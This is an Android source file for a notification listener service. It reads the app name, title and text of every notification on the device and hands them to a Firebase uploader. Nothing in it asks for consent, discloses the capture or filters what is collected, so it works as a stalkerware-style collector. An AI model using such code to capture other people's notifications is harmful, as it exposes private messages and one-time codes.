package com.yourname.notificationcapture;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class NotificationService extends NotificationListenerService {

    private static final String TAG = "NotificationService";
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private FirebaseUploader firebaseUploader;

    @Override
    public void onCreate() {
        super.onCreate();
        firebaseUploader = new FirebaseUploader();
        firebaseUploader.setContext(this);
        Log.d(TAG, "Notification Service Started");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        
        executor.execute(() -> {
            try {
                String packageName = sbn.getPackageName();
                String title = extractTitle(sbn);
                String text = extractText(sbn);
                long time = sbn.getPostTime();
                
                Log.i(TAG, "Notification Captured - " + packageName + ": " + title);
                
                firebaseUploader.uploadNotification(packageName, title, text, time);
                
            } catch (Exception e) {
                Log.e(TAG, "Error processing notification: " + e.getMessage());
            }
        });
    }

    private String extractTitle(StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
                return title != null ? title.toString() : "No Title";
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting title");
        }
        return "Unknown Title";
    }

    private String extractText(StatusBarNotification sbn) {
        try {
            if (sbn.getNotification().extras != null) {
                CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");
                return text != null ? text.toString() : "No Text";
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting text");
        }
        return "Unknown Text";
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
        Log.d(TAG, "Notification Service Stopped");
    }
}
